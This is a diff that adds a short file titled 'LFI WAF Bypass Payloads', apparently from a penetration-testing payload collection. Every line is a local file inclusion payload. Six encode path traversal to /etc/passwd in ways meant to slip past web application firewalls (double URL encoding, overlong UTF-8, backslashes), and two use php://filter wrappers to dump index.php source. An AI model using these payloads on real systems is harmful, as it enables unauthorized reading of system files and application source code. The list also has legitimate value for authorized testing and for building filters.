@@ -1,0 +1,9 @@
+# LFI WAF Bypass Payloads
+....\/....\/....\/etc/passwd
+..%252f..%252f..%252fetc%252fpasswd
+..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
+%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+..%5c..%5c..%5cetc%5cpasswd
+....\\....\\....\\etc\\passwd
+php://filter/convert.base64-encode/resource=index.php
+php://filter/read=string.rot13/resource=index.php
